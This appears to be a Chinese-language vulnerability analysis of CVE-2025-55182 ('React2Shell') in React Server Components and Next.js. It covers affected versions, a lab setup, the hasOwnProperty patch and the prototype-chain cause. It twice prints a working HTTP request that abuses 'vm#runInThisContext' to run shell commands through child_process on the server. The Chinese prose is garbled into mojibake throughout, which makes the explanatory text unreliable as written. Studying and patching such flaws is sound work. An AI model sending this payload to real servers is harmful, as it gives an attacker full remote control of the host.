# CVE-2025-55182_React2Shellæ¼æ´åˆ†æ



&lt;!--more--&gt;

## äº§å“ç®€ä»‹

React Server Componentsï¼ˆRSCï¼ŒReact æœåŠ¡ç«¯ç»„ä»¶ï¼‰ æ˜¯ React 19 æ¨å‡ºçš„æ–°æ¸²æŸ“æ¨¡å‹ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯è®©éƒ¨åˆ†ç»„ä»¶åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œï¼Œä»…å°†åºåˆ—åŒ–åçš„ç»“æœä¼ è¾“ç»™å®¢æˆ·ç«¯ã€‚

**ä¸»è¦ç‰¹æ€§ï¼š**

- **æœåŠ¡ç«¯æ‰§è¡Œ**ï¼šç»„ä»¶ä»£ç å¯ç›´æ¥åœ¨æœåŠ¡ç«¯æ‰§è¡Œä¸šåŠ¡é€»è¾‘ä¸æ•°æ®è·å–ï¼ˆå¦‚è®¿é—®æ•°æ®åº“ã€è°ƒç”¨å†…éƒ¨æœåŠ¡ï¼‰
- **Flight åè®®ä¼ è¾“**ï¼šå®¢æˆ·ç«¯æ¥æ”¶ç»è¿‡åºåˆ—åŒ–çš„â€React æ ‘æè¿°â€ï¼Œå†åœ¨æµè§ˆå™¨ä¸­ååºåˆ—åŒ–ä¸º React å…ƒç´ 
- **æµå¼æ¸²æŸ“**ï¼šæ”¯æŒå¢é‡ä¼ è¾“ï¼Œå…ˆå‘é€å·²è®¡ç®—å®Œæˆçš„éƒ¨åˆ†ï¼Œåç»­å†è¡¥å……å‰©ä½™å†…å®¹

è¿™å¥—æœºåˆ¶å·²æˆä¸º Next.js App Router çš„é»˜è®¤æ¶æ„ã€‚

## æ¼æ´æè¿°

**React Server Components è¢«æŠ«éœ²å…¶å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·CVE-2025-55182ã€‚å¹¶ä¸”å½±å“ä½¿ç”¨ App Router çš„ Next.js åº”ç”¨ç¨‹åºï¼Œå…¶æ¼æ´ç¼–å·CVE-2025-66478ã€‚ä¸¤ä¸ªæ¼æ´å‡å¯å¯¼è‡´æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç ç­‰å±å®³**

æ®å®˜æ–¹æè¿°ï¼Œåœ¨ React çš„æœåŠ¡å™¨ç»„ä»¶åº“ (React Server Componentsï¼Œå³ RSC)ä¸­ï¼Œç”±äº React åœ¨è§£ç å‘é€è‡³æœåŠ¡å™¨å‡½æ•°ç«¯ç‚¹çš„è¯·æ±‚è´Ÿè½½æ—¶å­˜åœ¨å®‰å…¨ç¼ºé™·ï¼Œå¯¼è‡´æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ä»»ä½•æœåŠ¡å™¨å‡½æ•°ç«¯ç‚¹å‘é€ç‰¹åˆ¶çš„æ¶æ„ HTTP è¯·æ±‚ï¼Œå½“è¯¥è¯·æ±‚è¢« React ååºåˆ—åŒ–å¤„ç†æ—¶ï¼Œå³å¯åœ¨æœåŠ¡å™¨ä¸Šå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»è€Œå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚

æ³¨ï¼šè¯¥æ¼æ´å½±å“æ‰€æœ‰ä½¿ç”¨å—å½±å“åº“å¹¶å¯ç”¨äº† React æœåŠ¡å™¨ç»„ä»¶æˆ–æœåŠ¡å™¨å‡½æ•°ç«¯ç‚¹çš„åº”ç”¨ã€‚

ç›®å‰è¯¥æ¼æ´çš„æ¼æ´ç»†èŠ‚ã€POCå·²å…¬å¼€ã€‚

**æ¼æ´ç¼–å·**

```
CVEç¼–å·:
React Serve CVE-2025-55182
Next.js     CVE-2025-66478
```

**å½±å“ç‰ˆæœ¬**

```
React:      19.0, [19.1.0,19.1.2), 19.2.0
React DOM:  19.0, [19.1.0,19.1.2), 19.2.0
react-server-dom-parcel (npm): 19.0, [19.1.0,19.1.2), 19.2.0
react-server-dom-turbopack (npm): 19.0, [19.1.0,19.1.2), 19.2.0  
react-server-dom-webpack (npm): 19.0, [19.1.0,19.1.2), 19.2.0

Next.js: 
14.3.0-canary.77 &lt;= Next.js &lt;Â 15.0.5  
15.1.0 &lt;= Next.jsÂ &lt; 15.1.9
15.2.0 &lt;= Next.jsÂ &lt; 15.2.6
15.3.0 &lt;= Next.jsÂ &lt; 15.3.6
15.4.0 &lt;= Next.js &lt; 15.4.8
15.5.0 &lt;= Next.jsÂ &lt; 15.5.7
16.0.0 &lt;= Next.jsÂ &lt; 16.0.7
```


## æ¼æ´å¤ç°

### ç¯å¢ƒæ­å»º
```sh
git clone https://github.com/ejpir/CVE-2025-55182-poc
cd CVE-2025-55182-poc

# Install dependencies
npm install
# Start vulnerable server (port 3002)
npm start
```


### POC
```http
POST /formaction HTTP/1.1
Host: localhost:3002
Content-Type: multipart/form-data; boundary=----Boundary
Content-Length: 297

------Boundary
Content-Disposition: form-data; name=&#34;$ACTION_REF_0&#34;

------Boundary
Content-Disposition: form-data; name=&#34;$ACTION_0:0&#34;

{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;global.process.mainModule.require(\&#34;child_process\&#34;).execSync(\&#34;id\&#34;).toString()&#34;]}
------Boundary--
```
![img](resource/CVE-2025-55182_ReactServerComponents_RSC_RCEç ”ç©¶èµ„æ–™.assets/file-20251208161906197.png)




## è¡¥ä¸åˆ†æ

![img](resource/CVE-2025-55182_ReactServerComponents_RSC_RCEç ”ç©¶èµ„æ–™.assets/file-20260104155025029.png)

å¯ä»¥å‘ç°

```js
return moduleExports[metadata[2]];
```

ä¿®æ”¹ä¸ºäº†

```js
if (hasOwnProperty.call(moduleExports, metadata[NAME])) {
    return moduleExports[metadata[NAME]];
  }
  return (undefined: any);
}
```

ä»£ç ä¿®å¤é‡Œé¢æ·»åŠ äº†hasOwnProperty æ£€æŸ¥ï¼Œåªå…è®¸è®¿é—®å¯¹è±¡è‡ªèº«çš„å±æ€§

è€Œåœ¨æ¼æ´ç‰ˆæœ¬ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶ `metadata[2]`ï¼Œå¯è¯»å–ä»»æ„å±æ€§ï¼ˆåŒ…æ‹¬åŸå‹é“¾ä¸Šçš„ï¼‰ï¼Œå¦‚ï¼š

- `__proto__.toString`
- `constructor.prototype`
- ç”šè‡³è·å–å±é™©æ–¹æ³•ï¼ˆå¦‚ vm.runInThisContextï¼‰

CVE-2025-55182 æ¼æ´çš„äº§ç”ŸåŸå› æ˜¯React Server Components (RSC) çš„ Flight åè®®ååºåˆ—åŒ–é€»è¾‘ä¸­å­˜åœ¨ä¸å®‰å…¨çš„å¤„ç†ã€‚

æ¼æ´çš„æ ¸å¿ƒé—®é¢˜åœ¨äºï¼šè·¯å¾„è§£æé€»è¾‘æœªé€šè¿‡ `hasOwnProperty` é™åˆ¶å¯è®¿é—®çš„å±æ€§èŒƒå›´ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ²¿åŸå‹é“¾è®¿é—®ä»»æ„å±æ€§ï¼ŒåŒ…æ‹¬ `__proto__`ã€`constructor` ç­‰æ•æ„Ÿå±æ€§ã€‚

## èƒŒæ™¯çŸ¥è¯†

### RSC

React Server Componentsï¼ˆRSCï¼ŒReact æœåŠ¡ç«¯ç»„ä»¶ï¼‰æ˜¯ React 19 æ¨å‡ºçš„æ ¸å¿ƒç‰¹æ€§â€”â€” æ ¸å¿ƒæ˜¯å°†ç»„ä»¶é€»è¾‘æ‹†åˆ†åˆ°æœåŠ¡ç«¯æ‰§è¡Œï¼Œä»…å‘å®¢æˆ·ç«¯ä¼ é€’ â€œæ¸²æŸ“æŒ‡ä»¤â€ è€Œéå®Œæ•´ JS ä»£ç ï¼Œæ—¢è§£å†³äº†å®¢æˆ·ç«¯æ¸²æŸ“ï¼ˆCSRï¼‰é¦–å±æ…¢ã€JS ä½“ç§¯å¤§çš„é—®é¢˜ï¼Œåˆå¼¥è¡¥äº†ä¼ ç»Ÿ SSR å…¨é‡æ°´åˆã€æœåŠ¡ç«¯ä»…è¾“å‡ºé™æ€ HTML çš„ç¼ºé™·ã€‚

RSC çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š**å°†ä¸€éƒ¨åˆ† React ç»„ä»¶çš„æ¸²æŸ“å·¥ä½œå®Œå…¨æ”¾åœ¨æœåŠ¡å™¨ä¸Šå®Œæˆï¼Œå¹¶å°†è¿™äº›æœåŠ¡å™¨ç»„ä»¶çš„æ¸²æŸ“ç»“æœä»¥ä¸€ç§ç‰¹æ®Šçš„æ•°æ®æ ¼å¼æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ï¼Œè€Œä¸éœ€è¦å°†è¿™äº›ç»„ä»¶çš„ JavaScript ä»£ç å‘é€åˆ°å®¢æˆ·ç«¯ã€‚**

ä¸ºäº†å®ç°è¿™ä¸€ç›®æ ‡ï¼ŒReact å›¢é˜Ÿè®¾è®¡äº†ä¸€ä¸ªå…¨æ–°çš„ç½‘ç»œåè®®ï¼Œç§°ä¹‹ä¸º **â€˜Flightâ€™ åè®®**ï¼Œå®ƒæ˜¯ä¸€ç§é«˜åº¦ä¼˜åŒ–çš„ã€å¢é‡çš„ã€å¯æµå¼ä¼ è¾“çš„è‡ªå®šä¹‰åºåˆ—åŒ–æ ¼å¼ï¼Œä¸“ä¸ºä¼ è¾“ React å…ƒç´ æ ‘å’Œå…¶æ‰€éœ€çš„æ•°æ®è€Œè®¾è®¡ã€‚å®ƒå…è®¸æœåŠ¡å™¨å‘é€â€œæŒ‡ä»¤â€ç»™å®¢æˆ·ç«¯ï¼Œå‘ŠçŸ¥å®¢æˆ·ç«¯å¦‚ä½•æ„å»ºæˆ–æ›´æ–° UIï¼Œè€Œä¸æ˜¯å‘é€é¢„å…ˆæ¸²æŸ“å¥½çš„ HTML ç‰‡æ®µæˆ–è€…å®Œæ•´çš„ JavaScript ç»„ä»¶ä»£ç ã€‚



RSCçš„ä¸€äº›æœ¯è¯­åŒ…æ‹¬ï¼š

| æœ¯è¯­                 | è¿è¡Œä½ç½® | æ ¸å¿ƒèƒ½åŠ›                                                     |
| -------------------- | -------- | ------------------------------------------------------------ |
| æœåŠ¡ç«¯ç»„ä»¶ï¼ˆSCï¼‰     | æœåŠ¡ç«¯   | 1. æ”¯æŒ async/await ç›´æ¥è¯·æ±‚æ•°æ®ï¼›&lt;br /&gt;2. ç›´æ¥è®¿é—®æœåŠ¡ç«¯èµ„æºï¼›&lt;br /&gt;3. ä»£ç ä¸æš´éœ²ç»™å®¢æˆ·ç«¯ |
| å®¢æˆ·ç«¯ç»„ä»¶ï¼ˆCCï¼‰     | å®¢æˆ·ç«¯   | 1. æ”¯æŒæ‰€æœ‰ React é’©å­ï¼›&lt;br /&gt;2. è®¿é—®æµè§ˆå™¨ APIï¼›&lt;br /&gt;3. å®ç°äº¤äº’é€»è¾‘ï¼ˆç‚¹å‡»ã€è¾“å…¥ï¼‰ |
| Server Actions       | æœåŠ¡ç«¯   | æ ‡è®°`&#39;use server&#39;`çš„å‡½æ•°ï¼Œå¤„ç†è¡¨å•æäº¤ã€æ•°æ®å†™å…¥ç­‰æœåŠ¡ç«¯æ“ä½œ |
| React Server Payload | ä¼ è¾“æ ¼å¼ | SC æ¸²æŸ“åçš„åºåˆ—åŒ–æ•°æ®ï¼ˆJSON / äºŒè¿›åˆ¶ï¼‰ï¼Œ&lt;br /&gt;å®¢æˆ·ç«¯ä»…è§£ææ¸²æŸ“ï¼Œä¸æ‰§è¡Œä»£ç  |



å…¶ä¸­è¦æä¸€ä¸‹çš„æ˜¯React Server Actionsï¼Œå®ƒæ˜¯ React 18 å¼•å…¥å¹¶å®Œå…¨é›†æˆåœ¨ Next.js 13&#43; App Router ä¸­çš„ä¸€é¡¹åŠŸèƒ½ã€‚å®ƒå…è®¸å¼€å‘è€…å®šä¹‰**æœåŠ¡ç«¯å‡½æ•°**ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯ç»„ä»¶ä¸­ç›´æ¥è°ƒç”¨ï¼Œè€Œæ— éœ€æ˜¾å¼åˆ›å»º API è·¯ç”±ã€‚

å½“ Server Action è¢«è°ƒç”¨æ—¶ï¼š

```text
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        SERVER ACTION æµç¨‹                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                               â”‚
â”‚   å®¢æˆ·ç«¯ (Client)                  ç½‘ç»œ (Network)              æœåŠ¡ç«¯ (Server)   â”‚
â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚
â”‚   1. ç”¨æˆ·æäº¤è¡¨å•                                                               â”‚
â”‚          â†“                                                                    â”‚
â”‚   2. React ä½¿ç”¨ Flight            POST /                                       â”‚
â”‚      åè®®åºåˆ—åŒ–å‚æ•°                 multipart/form-data      3. Next.js æ¥æ”¶è¯·æ±‚  â”‚
â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º  Next-Action: &lt;id&gt;               â†“            â”‚
â”‚                                                           4. Flightååºåˆ—åŒ–å‚æ•° â”‚
â”‚                                                                  â†“            â”‚
â”‚                                                           5.æ‰§è¡ŒServer Action  â”‚
â”‚   7. Reactæ ¹æ®å“åº”åŒ…            Flightåºåˆ—åŒ–çš„å“åº”                   â†“            â”‚
â”‚      æ›´æ–°å®¢æˆ·ç«¯ UI       â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     6. Flightåºåˆ—åŒ–è¿”å›å€¼ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```



å½“è°ƒç”¨ Server Action æ—¶ï¼ŒNext.js ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰`Next-Action`ç‰¹æ®Šæ ‡å¤´çš„ POST è¯·æ±‚ï¼š

```text
POST /page HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
Next-Action: 1234567890abcdef        â† Server Action æ ‡è¯†ç¬¦
Next-Router-State-Tree: ...          â† å®¢æˆ·ç«¯è·¯ç”±çŠ¶æ€
```

`Next-Action` æ ‡å¤´å‘ŠçŸ¥æœåŠ¡å™¨æ‰§è¡Œå“ªä¸ªå·²æ³¨å†Œçš„å‡½æ•°ã€‚è¯·æ±‚ä½“åŒ…å«åºåˆ—åŒ–åçš„å‚æ•°ã€‚



### Flightåè®®

æˆªè‡³ç›®å‰ï¼ŒReactFlight åè®®çš„æ–‡æ¡£å¹¶ä¸å®Œå–„ï¼Œå¯¹å®ƒçš„ç†è§£ä¸»è¦åŸºäºé€†å‘å·¥ç¨‹å’Œç¤¾åŒºç¤ºä¾‹ã€‚Flight åè®®å±äº React å†…éƒ¨æ ¸å¿ƒæœºåˆ¶ï¼Œæ— ç‹¬ç«‹å®˜æ–¹æ–‡æ¡£ï¼Œæ‰€æœ‰ç»†èŠ‚å‡åœ¨ **React æºç ** å’Œ **å®˜æ–¹ RSC ç¤ºä¾‹ä»“åº“** ä¸­ã€‚

åœ¨å…¸å‹çš„ Server Action è¯·æ±‚ä¸­ï¼ŒNext.js / React å‘é€ `multipart/form-data` è¯·æ±‚ï¼Œè¡¨å•å­—æ®µç»“æ„å¦‚ä¸‹ï¼š

- `name=&#34;0&#34;`: ä¸» payloadï¼ˆå¦‚å‚æ•°åˆ—è¡¨ï¼‰
- `name=&#34;1&#34;`: ç¬¬ 1 ä¸ªæ¨¡å‹å—ï¼ˆmodel chunkï¼‰
- `name=&#34;2&#34;`: ç¬¬ 2 ä¸ªæ¨¡å‹å—
- `...` : æ›´å¤šå—

Flight åè®®ä½¿ç”¨ `$` å‰ç¼€åŠ æ•°å­—è¡¨ç¤ºå¯¹ç‰¹å®š chunk çš„å¼•ç”¨ï¼Œå†’å·åˆ†éš”çš„è·¯å¾„ç”¨äºè®¿é—®åµŒå¥—å±æ€§ï¼š

- `&#34;$1&#34;`: å¼•ç”¨ chunk1 æœ¬èº«
- `&#34;$2:fruitName&#34;`: å¼•ç”¨ chunk2 è§£æåå¯¹è±¡çš„ `fruitName` å±æ€§
- `&#34;$3:user:email&#34;`: å¼•ç”¨ chunk3 ä¸­çš„ `.user.email`

å‡è®¾å®¢æˆ·ç«¯å‘é€å¦‚ä¸‹è¯·æ±‚ä½“ï¼š
```text
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name=&#34;0&#34;

[&#34;$1:profile:name&#34;]
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name=&#34;1&#34;

{&#34;profile&#34;:{&#34;name&#34;:&#34;alice&#34;,&#34;age&#34;:18}}
------WebKitFormBoundaryABC123--
```
å¯ä»¥çœ‹ä½œï¼š
```js
chunks = {  
  &#34;0&#34;: &#39;[&#34;$1:profile:name&#34;]&#39;,  
  &#34;1&#34;: &#39;{&#34;profile&#34;:{&#34;name&#34;:&#34;alice&#34;,&#34;age&#34;:18}}&#39;  
}
```

**è§£æè¿‡ç¨‹ï¼š**

```
&#34;$1:profile:name&#34;  
  â†’ æŸ¥æ‰¾ chunk1 å¹¶è§£æï¼š{&#34;profile&#34;:{&#34;name&#34;:&#34;alice&#34;,&#34;age&#34;:18}}  
  â†’ è®¿é—®è·¯å¾„ .profile.name  
  â†’ è¿”å› &#34;alice&#34;
```

å…·ä½“çš„ä»£ç é€»è¾‘ä¼šåœ¨åé¢è¿›è¡Œè§£é‡Šã€‚

### JSåŸå‹æ±¡æŸ“

JavaScript ä½¿ç”¨åŸå‹å®ç°ç»§æ‰¿ã€‚æ¯ä¸ªå¯¹è±¡éƒ½å¼•ç”¨ä¸€ä¸ªåŸå‹ï¼ŒåŸå‹æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”åŸå‹æœ¬èº«ä¹Ÿæœ‰ä¸€ä¸ªåŸå‹ï¼Œä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°æˆ‘ä»¬å¾—åˆ°æœ€åŸºæœ¬åŸå‹ï¼Œå®ƒè¢«ç§°ä¸ºObject.prototypeï¼Œå…¶è‡ªèº«åŸå‹æ˜¯nullã€‚

åœ¨åŸå‹é“¾æ±¡æŸ“æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šæ›´æ”¹å†…ç½®åŸå‹ï¼ˆä¾‹å¦‚`Object.prototype`ï¼‰ï¼Œå¯¼è‡´æ‰€æœ‰æ´¾ç”Ÿå¯¹è±¡éƒ½å…·æœ‰é¢å¤–çš„å±æ€§ï¼ŒåŒ…æ‹¬æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®çš„å¯¹è±¡ã€‚

å¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£å°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç±»çš„å¯¹è±¡ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“

```js
let foo = {bar:1};       // fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡ï¼Œfoo.baræ­¤æ—¶ä¸º1

foo.__proto__.bar = 2;  // ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³objectï¼‰
console.log(foo.bar);   // æŸ¥æ‰¾é¡ºåºåŸå› ï¼Œfoo.barä»ç„¶æ˜¯1

let zoo = {};           // æ­¤æ—¶ç”¨objecråˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡
console.log(zoo.bar);   // æŸ¥çœ‹zoo.barï¼Œç»“æœä¸º2

åŸå› ï¼š
	ä¿®æ”¹ foo åŸå‹foo.__proto__.bar = 2ï¼Œè€Œ foo æ˜¯ä¸€ä¸ªobjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2
	åæ¥ç”¨objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡ï¼Œlet zoo = {}ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†
```

æ›´å¤šä¸œè¥¿å¯ä»¥æŸ¥é˜…ä¸‹ Node.jsåŸå‹é“¾æ±¡æŸ“çš„ç›¸å…³æ–‡ç« ã€‚

åœ¨ JavaScript ä¸­ï¼Œä½¿ç”¨æ–¹æ‹¬å·Â `obj[key]`Â è®¿é—®å±æ€§æ—¶ï¼Œä¼š**éå†æ•´ä¸ªåŸå‹é“¾**ã€‚è¿™æ„å‘³ç€ï¼š

```js
const fs = require(&#39;fs&#39;); 
fs[&#39;readFileSync&#39;] // âœ… æ­£å¸¸ï¼šè®¿é—®è‡ªå·±çš„å±æ€§ 
fs[&#39;constructor&#39;] // âš ï¸ å±é™©ï¼šè®¿é—®åˆ° Object.prototype.constructor 
fs[&#39;__proto__&#39;] // âš ï¸ å±é™©ï¼šè®¿é—®åˆ° Object.prototype
```

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œé€šè¿‡Â `#constructor`ã€`#__proto__`Â ç­‰ç‰¹æ®Šå±æ€§åï¼Œè®¿é—®åˆ°æ¨¡å—å¯¼å‡ºå¯¹è±¡çš„åŸå‹é“¾å±æ€§ã€‚




## æ¼æ´åˆ†æ1-åŸºäºç®€æ˜“ç¯å¢ƒ

è¿™ä¸ªæ¼æ´åˆ†ææ˜¯åŸºäºGithubæ¼æ´åˆ†æç®€æ˜“ç¯å¢ƒï¼šhttps://github.com/ejpir/CVE-2025-55182-poc

è¿™é‡Œå…³æ³¨RSCæ¼æ´çš„æ ¸å¿ƒé—®é¢˜ï¼Œå¿½ç•¥äº†Flightåè®®éƒ¨åˆ†ã€‚

**ç¯å¢ƒæ­å»º**

```sh
git clone https://github.com/ejpir/CVE-2025-55182-poc
cd CVE-2025-55182-poc
npm install  # Install dependencies
npm start    # Start vulnerable server (port 3002)
```

### æ”»å‡»æµç¨‹

æˆ‘ä»¬çœ‹è¿™ä¸ªPOCï¼š
```http
POST /formaction HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name=&#34;$ACTION_REF_0&#34;

------Boundary
Content-Disposition: form-data; name=&#34;$ACTION_0:0&#34;

{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;]}
------Boundary--
```


å®Œæ•´çš„æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š
```
1. æ”»å‡»è€…å‘é€æ¶æ„ HTTP POST è¯·æ±‚
   â†“
2. è¯·æ±‚åŒ…å« $ACTION_REF_0 å’Œ $ACTION_0:0 å­—æ®µ
   â†“
3. decodeAction() è§£æè¯·æ±‚
   â†“
4. resolveServerReference() è§£ææ¨¡å—IDï¼ˆå¦‚ &#34;vm#runInThisContext&#34;ï¼‰
   â†“
5. requireModule() åŠ è½½æ¨¡å—å¹¶è®¿é—®å¯¼å‡º
   â†“
6. moduleExports[metadata[2]] è®¿é—®åŸå‹é“¾ âš ï¸
   â†“
7. è¿”å›å±é™©å‡½æ•°ï¼ˆå¦‚ vm.runInThisContextï¼‰
   â†“
8. å‡½æ•°è¢«è°ƒç”¨ï¼Œæ‰§è¡Œæ”»å‡»è€…ä»£ç ï¼ˆå¦‚Â execSync(&#39;id&#39;) ï¼‰  ğŸ’£ ğŸ’¥
```

![img](resource/CVE-2025-55182_ReactServerComponents_RSC_RCEç ”ç©¶èµ„æ–™.assets/file-20260104155708321.png)

### server.js
çœ‹æ¼æ´å¤ç°ç¯å¢ƒä¸­çš„server.jsï¼Œçœ‹çœ‹éƒ½åšäº†ä»€ä¹ˆã€‚

æ·»åŠ ç›¸åº”æ³¨é‡Šåï¼š
```js
/**
* åˆ›å»ºNode.js HTTPæœåŠ¡ï¼Œå¤„ç†RSC çš„Server Actionsè¡¨å•æäº¤è¯·æ±‚
* æ ¸å¿ƒåŠŸèƒ½ï¼šæ¥æ”¶POSTè¯·æ±‚çš„è¡¨å•æ•°æ®ï¼Œè§£æåè°ƒç”¨decodeActionè§£ææœåŠ¡ç«¯Actionï¼Œæ‰§è¡Œå‡½æ•°å¹¶è¿”å›ç»“æœï¼›
* @param {Object} req - HTTPè¯·æ±‚å¯¹è±¡ï¼ŒåŒ…å«è¯·æ±‚æ–¹æ³•ã€URLã€å¤´ä¿¡æ¯ã€è¡¨å•æ•°æ®ç­‰
* @param {Object} res - HTTPå“åº”å¯¹è±¡ï¼Œç”¨äºè¿”å›å¤„ç†ç»“æœ 
*/
const server = http.createServer(async (req, res) =&gt; {
  // å¿½ç•¥GETè¯·æ±‚ï¼Œä¸é‡è¦â€¦â€¦ å¤„ç†POSTè¯·æ±‚
  if (req.method === &#39;POST&#39; &amp;&amp; req.url === &#39;/formaction&#39;) {
    const chunks = [];
    // ç›‘å¬è¯·æ±‚æ•°æ®æ¥æ”¶äº‹ä»¶ï¼šé€å—æ”¶é›†äºŒè¿›åˆ¶æ•°æ®
    req.on(&#39;data&#39;, chunk =&gt; chunks.push(chunk));
    // ç›‘å¬è¯·æ±‚æ•°æ®æ¥æ”¶å®Œæˆäº‹ä»¶ï¼šè§£æè¡¨å•æ•°æ®å¹¶å¤„ç†Action
    req.on(&#39;end&#39;, async () =&gt; {
      try {
        // 1. è¿˜åŸå®Œæ•´çš„è¡¨å•æ•°æ®ï¼Œæ‹¼æ¥æ‰€æœ‰æ•°æ®å—ä¸ºå®Œæ•´çš„Buffer
        const buffer = Buffer.concat(chunks);
        const contentType = req.headers[&#39;content-type&#39;] || &#39;&#39;;
        // 2. ä»Content-Typeä¸­æå–boundaryåˆ†éš”ç¬¦
        const boundaryMatch = contentType.match(/boundary=(.&#43;)/);
        if (!boundaryMatch) throw new Error(&#39;No boundary&#39;);
        // 3. è§£æmultipart/form-dataæ ¼å¼çš„è¡¨å•æ•°æ®ä¸ºFormDataå¯¹è±¡
        const formData = parseMultipart(buffer, boundaryMatch[1]);
        console.log(&#39;FormData:&#39;);
        formData.forEach((v, k) =&gt; console.log(` ${k}: ${v}`));
        
        // 4. æ ¸å¿ƒé€»è¾‘ï¼šdecodeAction è§£æè¡¨å•æ•°æ®ä¸­çš„Server Actionï¼ŒåŠ è½½å¯¹åº”çš„æœåŠ¡ç«¯å‡½æ•°
        // æ ¸å¿ƒæ¼æ´ç‚¹ï¼Œè°ƒç”¨é“¾ï¼šdecodeAction â†’ loadServerReference â†’ requireModule
        // requireModule: moduleExports[metadata[2]] ç¼ºå°‘ hasOwnProperty æ£€æµ‹ï¼Œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“
        const actionFn = await decodeAction(formData, serverManifest);
        console.log(&#39;Action result:&#39;, actionFn, typeof actionFn);
        
        // 5. æ‰§è¡ŒActionå‡½æ•°å¹¶è¿”å›ç»“æœ
        if (typeof actionFn === &#39;function&#39;) {
          // è‹¥è§£æå‡ºåˆæ³•å‡½æ•°ï¼Œæ‰§è¡Œå‡½æ•°å¹¶è¿”å›æˆåŠŸç»“æœ
          const result = actionFn();
          res.writeHead(200, { &#39;Content-Type&#39;: &#39;application/json&#39; });
          res.end(JSON.stringify({ success: true, result: String(result) }));
        } else {
          // è‹¥æœªè§£æå‡ºå‡½æ•°ï¼Œè¿”å›Actionçš„å­—ç¬¦ä¸²å½¢å¼
          res.writeHead(200, { &#39;Content-Type&#39;: &#39;application/json&#39; });
          res.end(JSON.stringify({ success: true, action: String(actionFn) }));
        }
      } catch (e) {
        // â€¦â€¦
});
```

